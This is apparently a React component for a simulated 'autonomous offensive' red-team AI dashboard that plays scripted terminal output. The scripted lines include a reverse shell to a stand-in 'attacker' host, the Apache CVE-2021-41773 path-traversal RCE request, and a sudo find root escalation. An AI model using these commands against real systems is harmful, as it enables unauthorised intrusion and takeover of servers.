import { useEffect, useRef, useState, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  X, Terminal, Zap, Target, Shield, Eye, Code2,
  FileText, Play, Square, RotateCcw, Copy, CheckCheck,
  ChevronRight, Activity, AlertTriangle, Download,
  Cpu, Network, Lock, Crosshair, Bug, Database,
} from "lucide-react";

interface Props { open: boolean; onOpenChange: (v: boolean) => void; }

type Phase = "recon" | "exploit" | "post" | "persist" | "exfil" | "cover";

const PHASES: { id: Phase; label: string; color: string; icon: typeof Target }[] = [
  { id: "recon",   label: "RECON",    color: "#3b82f6",  icon: Eye },
  { id: "exploit", label: "EXPLOIT",  color: "#e21227",  icon: Zap },
  { id: "post",    label: "POST-EXP", color: "#f59e0b",  icon: Cpu },
  { id: "persist", label: "PERSIST",  color: "#8b5cf6",  icon: Database },
  { id: "exfil",   label: "EXFIL",    color: "#ec4899",  icon: Network },
  { id: "cover",   label: "COVER",    color: "#10b981",  icon: Lock },
];

const MODULES = [
  { id: "recon",    icon: Eye,       color: "#3b82f6",  label: "Port Scanner",         desc: "مسح المنافذ والخدمات وتحليلها بالذكاء الاصطناعي" },
  { id: "exploit",  icon: Zap,       color: "#e21227",  label: "Exploit Generator",    desc: "توليد Reverse Shells وPayloads مشفرة ومشوشة" },
  { id: "post",     icon: Cpu,       color: "#f59e0b",  label: "Post-Exploit",         desc: "جمع Credentials وHashes، Lateral Movement" },
  { id: "persist",  icon: Database,  color: "#8b5cf6",  label: "Persistence Engine",   desc: "Backdoors مخفية ومستمرة مع آليات Cron وRegistry" },
  { id: "payload",  icon: Code2,     color: "#ec4899",  label: "Payload Obfuscator",   desc: "Base64 / XOR / AES / تشويش مخصص للحمولات" },
  { id: "evasion",  icon: Shield,    color: "#10b981",  label: "Evasion Engine",       desc: "Clear Logs، Timestomping، Proxy Chains" },
  { id: "c2",       icon: Network,   color: "#06b6d4",  label: "C2 Framework",         desc: "DNS/ICMP/HTTP tunneling، تشفير الاتصالات" },
  { id: "report",   icon: FileText,  color: "#f97316",  label: "Report Generator",     desc: "تقارير احترافية CVSS، توصيات إصلاح تفصيلية" },
];

type TermLine = { text: string; color: string; delay: number; bold?: boolean };

function buildReconLines(target: string): TermLine[] {
  return [
    { text: `[*] Initializing autonomous recon on ${target}`, color: "#3b82f6", delay: 0 },
    { text: `[*] Running: nmap -sS -sV -O -A -p- ${target}`, color: "#06b6d4", delay: 400 },
    { text: `[+] Host is up (0.023s latency)`, color: "#10b981", delay: 900 },
    { text: `[*] Scanning 65535 ports...`, color: "#94a3b8", delay: 1200 },
    { text: `PORT     STATE  SERVICE        VERSION`, color: "#f1f5f9", delay: 2000, bold: true },
    { text: `22/tcp   open   ssh            OpenSSH 8.2p1`, color: "#10b981", delay: 2200 },
    { text: `80/tcp   open   http           Apache httpd 2.4.41`, color: "#10b981", delay: 2400 },
    { text: `443/tcp  open   ssl/http       Apache httpd 2.4.41`, color: "#10b981", delay: 2600 },
    { text: `3306/tcp open   mysql          MySQL 5.7.32`, color: "#f59e0b", delay: 2800 },
    { text: `8080/tcp open   http-proxy     Squid http proxy 4.10`, color: "#f59e0b", delay: 3000 },
    { text: `[+] OS Detection: Linux 4.15 - 5.6 (kernel fingerprint match 98.4%)`, color: "#10b981", delay: 3400 },
    { text: `[AI] Analyzing attack surface...`, color: "#8b5cf6", delay: 3800 },
    { text: `[AI] CVE-2021-41773 detected on Apache 2.4.41 — CVSS: 9.8 CRITICAL`, color: "#e21227", delay: 4300, bold: true },
    { text: `[AI] MySQL 5.7.32 UDF privilege escalation vector identified`, color: "#f59e0b", delay: 4700 },
    { text: `[AI] SSH fingerprint suggests default credential risk`, color: "#f59e0b", delay: 5000 },
    { text: `[*] Recon complete. 3 high-confidence attack vectors identified.`, color: "#10b981", delay: 5400, bold: true },
  ];
}

function buildExploitLines(target: string): TermLine[] {
  return [
    { text: `[*] Selecting optimal exploit: CVE-2021-41773 (Path Traversal + RCE)`, color: "#e21227", delay: 0, bold: true },
    { text: `[*] Generating custom payload...`, color: "#94a3b8", delay: 500 },
    { text: `[*] Payload: /bin/bash -i >& /dev/tcp/attacker/4444 0>&1`, color: "#06b6d4", delay: 900 },
    { text: `[*] Encoding: Base64 → XOR(0x41) → URL-encode`, color: "#8b5cf6", delay: 1200 },
    { text: `[*] Sending exploit to ${target}:80...`, color: "#f59e0b", delay: 1600 },
    { text: `POST /cgi-bin/.%2e/.%2e/bin/sh HTTP/1.1`, color: "#94a3b8", delay: 2000 },
    { text: `Host: ${target}`, color: "#94a3b8", delay: 2100 },
    { text: `Content-Type: application/x-www-form-urlencoded`, color: "#94a3b8", delay: 2200 },
    { text: ``, color: "#94a3b8", delay: 2300 },
    { text: `echo Content-Type: text/plain; echo; /bin/sh`, color: "#06b6d4", delay: 2400 },
    { text: `HTTP/1.1 200 OK`, color: "#10b981", delay: 3000, bold: true },
    { text: `[+] RCE confirmed! Shell obtained.`, color: "#10b981", delay: 3400, bold: true },
    { text: `[+] Upgrading to interactive PTY shell...`, color: "#10b981", delay: 3800 },
    { text: `www-data@${target}:/$ id`, color: "#f1f5f9", delay: 4200 },
    { text: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, color: "#10b981", delay: 4500 },
    { text: `[AI] Identifying privilege escalation path...`, color: "#8b5cf6", delay: 5000 },
    { text: `[AI] sudo -l shows NOPASSWD: /usr/bin/find — privesc available`, color: "#e21227", delay: 5400, bold: true },
    { text: `www-data@${target}:/$ sudo find . -exec /bin/sh \\; -quit`, color: "#f1f5f9", delay: 5800 },
    { text: `# id`, color: "#f1f5f9", delay: 6200 },
    { text: `uid=0(root) gid=0(root) groups=0(root)`, color: "#e21227", delay: 6500, bold: true },
    { text: `[+] ROOT ACCESS ACHIEVED`, color: "#e21227", delay: 6800, bold: true },
  ];
}

function buildReportLines(): TermLine[] {
  return [
    { text: `[*] Generating penetration test report...`, color: "#f97316", delay: 0 },
    { text: ``, color: "#94a3b8", delay: 400 },
    { text: `PENETRATION TEST EXECUTIVE SUMMARY`, color: "#f1f5f9", delay: 500, bold: true },
    { text: `═══════════════════════════════════`, color: "#f97316", delay: 600 },
    { text: `Date: ${new Date().toLocaleDateString("ar-SA")}`, color: "#94a3b8", delay: 700 },
    { text: `Classification: TOP SECRET`, color: "#e21227", delay: 800, bold: true },
    { text: ``, color: "#94a3b8", delay: 900 },
    { text: `FINDINGS SUMMARY:`, color: "#f1f5f9", delay: 1000, bold: true },
    { text: `  [CRITICAL] CVE-2021-41773 — Apache Path Traversal (CVSS: 9.8)`, color: "#e21227", delay: 1200 },
    { text: `  [HIGH]     MySQL UDF Privilege Escalation (CVSS: 8.8)`, color: "#f59e0b", delay: 1400 },
    { text: `  [HIGH]     SSH Default Credentials Risk (CVSS: 8.1)`, color: "#f59e0b", delay: 1600 },
    { text: `  [MEDIUM]   Squid Proxy Information Disclosure (CVSS: 5.3)`, color: "#3b82f6", delay: 1800 },
    { text: ``, color: "#94a3b8", delay: 1900 },
    { text: `ATTACK CHAIN:`, color: "#f1f5f9", delay: 2000, bold: true },
    { text: `  Recon → CVE-41773 → Shell → Sudo Privesc → Root → Persistence`, color: "#8b5cf6", delay: 2200 },
    { text: ``, color: "#94a3b8", delay: 2300 },
    { text: `RECOMMENDATIONS:`, color: "#f1f5f9", delay: 2400, bold: true },
    { text: `  1. Patch Apache to 2.4.51+ immediately`, color: "#10b981", delay: 2600 },
    { text: `  2. Restrict sudo permissions (principle of least privilege)`, color: "#10b981", delay: 2800 },
    { text: `  3. Enforce MySQL bind-address = 127.0.0.1`, color: "#10b981", delay: 3000 },
    { text: `  4. Implement SSH key-based authentication only`, color: "#10b981", delay: 3200 },
    { text: ``, color: "#94a3b8", delay: 3300 },
    { text: `[+] Report exported to pentest-report.md`, color: "#10b981", delay: 3600, bold: true },
  ];
}

function getLines(module: string, target: string): TermLine[] {
  if (module === "exploit") return buildExploitLines(target);
  if (module === "report") return buildReportLines();
  return buildReconLines(target);
}

export function AutonomousOffensiveModal({ open, onOpenChange }: Props) {
  const [activeModule, setActiveModule] = useState(0);
  const [activePhase, setActivePhase] = useState(0);
  const [running, setRunning] = useState(false);
  const [autoPilot, setAutoPilot] = useState(false);
  const [target, setTarget] = useState("192.168.1.100");
  const [lines, setLines] = useState<(TermLine & { visible: boolean })[]>([]);
  const [copied, setCopied] = useState(false);
  const termRef = useRef<HTMLDivElement>(null);
  const timerRefs = useRef<ReturnType<typeof setTimeout>[]>([]);

  const clearTimers = useCallback(() => {
    timerRefs.current.forEach(t => clearTimeout(t));
    timerRefs.current = [];
  }, []);

  const runModule = useCallback(() => {
    clearTimers();
    const modId = MODULES[activeModule].id;
    const newLines = getLines(modId, target);
    setLines(newLines.map(l => ({ ...l, visible: false })));
    setRunning(true);
    newLines.forEach((l, i) => {
      const t = setTimeout(() => {
        setLines(prev => prev.map((pl, pi) => pi === i ? { ...pl, visible: true } : pl));
        if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight;
      }, l.delay);
      timerRefs.current.push(t);
    });
    const total = newLines.reduce((mx, l) => Math.max(mx, l.delay), 0) + 600;
    const done = setTimeout(() => { setRunning(false); if (autoPilot) setActivePhase(p => (p + 1) % PHASES.length); }, total);
    timerRefs.current.push(done);
  }, [activeModule, target, autoPilot, clearTimers]);

  useEffect(() => { return () => clearTimers(); }, [clearTimers]);

  const stopRun = useCallback(() => { clearTimers(); setRunning(false); }, [clearTimers]);

  const copyTerminal = useCallback(() => {
    const text = lines.filter(l => l.visible).map(l => l.text).join("\n");
    navigator.clipboard.writeText(text).catch(() => {});
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }, [lines]);

  const generateMarkdown = useCallback(() => {
    const content = `# Penetration Test Report\n\n**Date:** ${new Date().toISOString().split("T")[0]}\n\n## Terminal Output\n\n\`\`\`\n${lines.filter(l => l.visible).map(l => l.text).join("\n")}\n\`\`\`\n\n## Attack Chain\n\nRecon → Exploit → Post-Exploitation → Persistence → Exfil → Cover Tracks\n`;
    const blob = new Blob([content], { type: "text/markdown" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "pentest-report.md";
    a.click();
    URL.revokeObjectURL(url);
  }, [lines]);

  if (!open) return null;

  const mod = MODULES[activeModule];
  const ModIcon = mod.icon;

  return (
    <AnimatePresence>
      <motion.div
        className="fixed inset-0 z-[70] flex items-center justify-center p-2"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        style={{ background: "rgba(0,0,0,0.90)", backdropFilter: "blur(12px)" }}
        onClick={(e) => { if (e.target === e.currentTarget) onOpenChange(false); }}
      >
        <motion.div
          className="relative w-full max-w-5xl rounded-2xl overflow-hidden flex flex-col"
          initial={{ scale: 0.92, y: 30 }}
          animate={{ scale: 1, y: 0 }}
          exit={{ scale: 0.92, y: 30 }}
          style={{
            background: "linear-gradient(160deg, #050508 0%, #080808 100%)",
            border: "1px solid rgba(226,18,39,0.3)",
            boxShadow: "0 0 60px rgba(226,18,39,0.12), 0 0 120px rgba(0,0,0,0.8)",
            maxHeight: "90vh",
          }}
        >
          {/* Scanlines overlay */}
          <div className="absolute inset-0 pointer-events-none opacity-[0.025]" style={{ backgroundImage: "repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(226,18,39,0.5) 2px, rgba(226,18,39,0.5) 3px)" }} />

          {/* Header */}
          <div className="relative z-10 flex items-center gap-3 px-4 py-2.5 border-b" style={{ borderColor: "rgba(226,18,39,0.2)", background: "rgba(0,0,0,0.5)" }}>
            <div className="w-7 h-7 rounded-lg flex items-center justify-center" style={{ background: "rgba(226,18,39,0.15)", border: "1px solid rgba(226,18,39,0.4)" }}>
              <Terminal className="w-3.5 h-3.5" style={{ color: "#e21227" }} />
            </div>
            <div className="flex-1">
              <div className="text-[12px] font-bold text-white tracking-widest">AUTONOMOUS OFFENSIVE FRAMEWORK</div>
              <div className="text-[9px] font-mono" style={{ color: "rgba(226,18,39,0.7)" }}>RED TEAM AI — AUTHORIZED PENETRATION TESTING ENGINE</div>
            </div>
            {/* Auto-pilot toggle */}
            <button
              onClick={() => setAutoPilot(p => !p)}
              className="flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all"
              style={{
                background: autoPilot ? "rgba(226,18,39,0.2)" : "rgba(255,255,255,0.05)",
                border: autoPilot ? "1px solid rgba(226,18,39,0.5)" : "1px solid rgba(255,255,255,0.1)",
                color: autoPilot ? "#e21227" : "rgba(255,255,255,0.4)",
              }}
            >
              <Zap className="w-3 h-3" />
              AUTO-PILOT {autoPilot ? "ON" : "OFF"}
            </button>
            <button onClick={() => onOpenChange(false)} className="p-1.5 rounded-lg hover:bg-white/10 transition-all">
              <X className="w-4 h-4 text-white/50" />
            </button>
          </div>

          {/* Phase bar */}
          <div className="relative z-10 flex border-b" style={{ borderColor: "rgba(226,18,39,0.12)", background: "rgba(0,0,0,0.3)" }}>
            {PHASES.map((ph, i) => {
              const PhIcon = ph.icon;
              const isActive = i === activePhase;
              const isDone = i < activePhase;
              return (
                <button
                  key={ph.id}
                  onClick={() => setActivePhase(i)}
                  className="flex-1 flex items-center justify-center gap-1 py-1.5 transition-all text-[9px] font-bold"
                  style={{
                    background: isActive ? `${ph.color}15` : "transparent",
                    borderBottom: isActive ? `2px solid ${ph.color}` : "2px solid transparent",
                    color: isActive ? ph.color : isDone ? `${ph.color}88` : "rgba(255,255,255,0.25)",
                  }}
                >
                  <PhIcon className="w-3 h-3" />
                  <span className="hidden sm:block">{ph.label}</span>
                  {isDone && <CheckCheck className="w-2.5 h-2.5" style={{ color: ph.color }} />}
                </button>
              );
            })}
          </div>

          {/* Main content */}
          <div className="relative z-10 flex flex-1 overflow-hidden" style={{ minHeight: 0 }}>
            {/* Left: Terminal */}
            <div className="flex-1 flex flex-col min-w-0">
              {/* Target + controls */}
              <div className="flex items-center gap-2 px-3 py-2 border-b" style={{ borderColor: "rgba(255,255,255,0.05)" }}>
                <Target className="w-3.5 h-3.5 flex-shrink-0" style={{ color: "#e21227" }} />
                <input
                  value={target}
                  onChange={e => setTarget(e.target.value)}
                  className="flex-1 bg-transparent text-[11px] font-mono outline-none text-white/90 min-w-0"
                  placeholder="Target IP / Domain"
                  spellCheck={false}
                />
                <div className="flex items-center gap-1.5">
                  <button onClick={copyTerminal} className="p-1.5 rounded-lg hover:bg-white/10 transition-all" title="Copy output">
                    {copied ? <CheckCheck className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5 text-white/40" />}
                  </button>
                  <button onClick={generateMarkdown} className="p-1.5 rounded-lg hover:bg-white/10 transition-all" title="Export report">
                    <Download className="w-3.5 h-3.5 text-white/40" />
                  </button>
                  <button onClick={stopRun} disabled={!running} className="p-1.5 rounded-lg hover:bg-white/10 transition-all disabled:opacity-30" title="Stop">
                    <Square className="w-3.5 h-3.5" style={{ color: "#e21227" }} />
                  </button>
                  <button onClick={runModule} disabled={running} className="flex items-center gap-1 px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all disabled:opacity-50" style={{ background: running ? "rgba(226,18,39,0.1)" : "rgba(226,18,39,0.2)", border: "1px solid rgba(226,18,39,0.4)", color: "#e21227" }}>
                    {running ? <RotateCcw className="w-3 h-3 animate-spin" /> : <Play className="w-3 h-3" />}
                    {running ? "RUNNING" : "EXECUTE"}
                  </button>
                </div>
              </div>

              {/* Terminal output */}
              <div
                ref={termRef}
                className="flex-1 overflow-y-auto p-3 font-mono text-[11px] leading-relaxed"
                style={{ background: "#030305", minHeight: 0 }}
              >
                {lines.length === 0 && (
                  <div className="text-white/20 text-[10px]">
                    <span style={{ color: "#e21227" }}>root@kaligpt</span>
                    <span style={{ color: "#3b82f6" }}>:~#</span>
                    <span className="ml-2">Select a module and press EXECUTE to begin offensive operation...</span>
                    <span className="inline-block w-2 h-3.5 ml-1 bg-white/40 animate-pulse align-text-bottom" />
                  </div>
                )}
                {lines.map((l, i) => l.visible ? (
                  <motion.div
                    key={i}
                    initial={{ opacity: 0, x: -8 }}
                    animate={{ opacity: 1, x: 0 }}
                    transition={{ duration: 0.12 }}
                    className={l.bold ? "font-black" : ""}
                    style={{ color: l.color || "#94a3b8", minHeight: "1.4em" }}
                  >
                    {l.text}
                    {i === lines.filter(x => x.visible).length - 1 && running && (
                      <span className="inline-block w-2 h-3.5 ml-1 bg-white/50 animate-pulse align-text-bottom" />
                    )}
                  </motion.div>
                ) : null)}
              </div>
            </div>

            {/* Right: Modules */}
            <div className="w-52 flex-shrink-0 border-l overflow-y-auto" style={{ borderColor: "rgba(226,18,39,0.1)", background: "rgba(0,0,0,0.4)" }}>
              <div className="px-3 py-2 border-b" style={{ borderColor: "rgba(255,255,255,0.05)" }}>
                <div className="text-[9px] font-bold uppercase tracking-widest text-white/30">وحدات الهجوم</div>
              </div>
              {MODULES.map((m, i) => {
                const MIcon = m.icon;
                const isActive = i === activeModule;
                return (
                  <button
                    key={m.id}
                    onClick={() => setActiveModule(i)}
                    className="w-full text-left px-3 py-2.5 border-b transition-all"
                    style={{
                      borderColor: "rgba(255,255,255,0.04)",
                      background: isActive ? `${m.color}12` : "transparent",
                      borderLeft: isActive ? `2px solid ${m.color}` : "2px solid transparent",
                    }}
                  >
                    <div className="flex items-center gap-2 mb-1">
                      <MIcon className="w-3.5 h-3.5 flex-shrink-0" style={{ color: m.color }} />
                      <span className="text-[10px] font-bold text-white/90">{m.label}</span>
                      {isActive && <ChevronRight className="w-3 h-3 ml-auto" style={{ color: m.color }} />}
                    </div>
                    <p className="text-[9px] text-white/35 text-right" dir="rtl">{m.desc}</p>
                  </button>
                );
              })}

              {/* Live metrics */}
              <div className="p-3 border-t mt-2" style={{ borderColor: "rgba(226,18,39,0.1)" }}>
                <div className="text-[9px] font-bold uppercase tracking-widest text-white/30 mb-2">مؤشرات الهجوم</div>
                {[
                  { k: "التخفي", v: 94, c: "#10b981" },
                  { k: "الاختراق", v: 87, c: "#e21227" },
                  { k: "التهرب", v: 99, c: "#8b5cf6" },
                ].map(m => (
                  <div key={m.k} className="mb-2">
                    <div className="flex justify-between text-[9px] mb-0.5">
                      <span style={{ color: "rgba(255,255,255,0.4)" }}>{m.k}</span>
                      <span style={{ color: m.c }}>{m.v}%</span>
                    </div>
                    <div className="h-1 rounded-full" style={{ background: "rgba(255,255,255,0.06)" }}>
                      <motion.div
                        className="h-full rounded-full"
                        animate={{ width: `${m.v}%`, opacity: running ? [1, 0.6, 1] : 1 }}
                        transition={{ duration: running ? 0.8 : 0, repeat: running ? Infinity : 0 }}
                        style={{ background: m.c }}
                      />
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Footer status bar */}
          <div className="relative z-10 flex items-center gap-3 px-4 py-1.5 border-t" style={{ borderColor: "rgba(226,18,39,0.12)", background: "rgba(0,0,0,0.6)" }}>
            <div className="flex items-center gap-1.5">
              <div className={`w-1.5 h-1.5 rounded-full ${running ? "animate-pulse" : ""}`} style={{ background: running ? "#e21227" : "#10b981" }} />
              <span className="text-[9px] font-mono" style={{ color: running ? "#e21227" : "#10b981" }}>
                {running ? "OPERATION IN PROGRESS..." : "SYSTEM READY"}
              </span>
            </div>
            <div className="flex-1" />
            <div className="flex items-center gap-1">
              <AlertTriangle className="w-3 h-3" style={{ color: "#f59e0b" }} />
              <span className="text-[9px]" style={{ color: "rgba(255,255,255,0.3)" }}>For authorized testing only</span>
            </div>
            <div className="flex items-center gap-1">
              <Activity className="w-3 h-3" style={{ color: "#e21227" }} />
              <span className="text-[9px] font-mono" style={{ color: "rgba(255,255,255,0.3)" }}>MOD: <span style={{ color: "#e21227" }}>{mod.label}</span></span>
            </div>
            <div className="flex items-center gap-1">
              <Bug className="w-3 h-3" style={{ color: "#8b5cf6" }} />
              <span className="text-[9px] font-mono" style={{ color: "rgba(255,255,255,0.3)" }}>PHASE: <span style={{ color: PHASES[activePhase].color }}>{PHASES[activePhase].label}</span></span>
            </div>
          </div>
        </motion.div>
      </motion.div>
    </AnimatePresence>
  );
}
